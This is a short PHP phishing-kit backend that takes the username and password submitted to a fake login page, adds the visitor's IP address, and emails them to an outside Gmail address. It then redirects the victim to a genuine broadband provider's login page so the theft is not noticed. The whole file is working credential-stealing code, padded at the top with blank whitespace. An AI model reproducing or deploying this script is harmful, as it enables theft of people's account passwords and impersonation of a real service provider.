<?
                                                                                                                                                              

          

                                                            
$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "Email-ID : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY GPA-----------\n";
$send = "fegrapuoltry3@gmail.com";
$subject = "--New Log $ip -- Source:(email.on-nets.com)";


mail($send,$subject,$message,$headers);


$redirect = "https://e-account.hgcbroadband.com/ecs/Welcome.do";

header("Location: " . $redirect);
 
?>